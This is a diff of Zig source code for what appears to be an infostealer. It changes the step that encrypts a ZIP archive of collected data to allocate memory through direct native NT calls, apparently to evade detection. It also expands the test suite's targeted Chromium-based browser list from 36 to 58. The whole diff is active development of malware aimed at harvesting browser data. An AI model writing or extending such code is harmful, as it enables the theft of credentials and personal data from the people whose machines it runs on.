@@ -380,8 +380,32 @@ fn runProductionPipeline() void {
     log("[+] ZIP archive: {d} bytes\n", .{archive.len});
 
     logMsg("[+] Encrypting archive...\n");
-    var enc_buf: [1024 * 1024]u8 = undefined;
-    const encrypted = archive_crypt.encryptArchive(archive, &enc_buf) orelse {
+    var enc_base: ?types.PVOID = null;
+    var enc_size: types.SIZE_T = 1024 * 1024;
+    const alloc_status = engine.NtAllocateVirtualMemory(
+        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
+        @as(*types.PVOID, @ptrCast(&enc_base)),
+        0,
+        &enc_size,
+        types.MEM_COMMIT | types.MEM_RESERVE,
+        types.PAGE_READWRITE,
+    );
+    if (alloc_status < 0 or enc_base == null) {
+        logMsg("[!] Failed to allocate encryption buffer\n");
+        return;
+    }
+    defer {
+        var free_base: ?types.PVOID = enc_base;
+        var free_size: types.SIZE_T = 0;
+        _ = engine.NtFreeVirtualMemory(
+            @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
+            @as(*types.PVOID, @ptrCast(&free_base)),
+            &free_size,
+            types.MEM_RELEASE,
+        );
+    }
+    const enc_buf = @as([*]u8, @ptrCast(@alignCast(enc_base.?)))[0..1024*1024];
+    const encrypted = archive_crypt.encryptArchive(archive, enc_buf) orelse {
         logMsg("[!] Archive encryption failed\n");
         return;
     };
@@ -812,7 +836,7 @@ fn runDebugTests() void {
 
     dbg.print("--- 4.2.1 Browser paths ---\n");
     const browsers = chromium_paths.getChromiumBrowsers();
-    assert(browsers.len == 36, "36 chromium browsers configured");
+    assert(browsers.len == 58, "58 chromium browsers configured");
     assert(browsers[0].name[0] == 'C', "first browser is Chrome");
     dbg.print(" ");
     dbg.printHex(browsers.len);
@@ -898,7 +922,7 @@ fn runDebugTests() void {
 
     dbg.print("--- 4.3.1 Chromium paths ---\n");
     const chrome_browsers = chromium_paths.getChromiumBrowsers();
-    assert(chrome_browsers.len == 36, "36 chromium browsers");
+    assert(chrome_browsers.len == 58, "58 chromium browsers");
     assert(chrome_browsers[0].name[0] == 'C', "Chrome first");
     assert(chrome_browsers[5].use_roaming == true, "Opera uses roaming");
     dbg.print("  Chromium: ");
